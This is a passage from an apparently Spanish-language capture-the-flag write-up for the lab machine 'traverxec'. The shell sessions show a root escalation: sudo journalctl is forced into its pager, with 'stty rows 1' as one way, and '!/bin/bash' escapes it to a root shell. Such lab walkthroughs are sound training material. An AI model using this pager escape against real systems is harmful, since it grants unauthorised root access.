david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Sun 2021-10-17 18:09:21 EDT, end at Sun 2021-10-17 19:25:33 EDT. --
Oct 17 18:34:04 traverxec sudo[3841]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty= ruser=www-data rhost=  user=www-data
Oct 17 18:34:06 traverxec sudo[3841]: pam_unix(sudo:auth): conversation failed
Oct 17 18:34:06 traverxec sudo[3841]: pam_unix(sudo:auth): auth could not identify password for [www-data]
!/bin/bash
root@traverxec:/home/david# id
uid=0(root) gid=0(root) groups=0(root)
root@traverxec:/home/david# cd /root
root@traverxec:~# ls
nostromo_1.9.6-1.deb  root.txt
root@traverxec:~# cut -c-5 root.txt
9aa36
```

Alternativamente, podemos configurar las filas stty para que tengan menos de 5 filas (líneas verticales):

```shell
david@traverxec:~$ stty rows 1
david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
!/bin/bash
root@traverxec:/home/david# id
uid=0(root) gid=0(root) groups=0(root)
root@traverxec:/home/david#
```
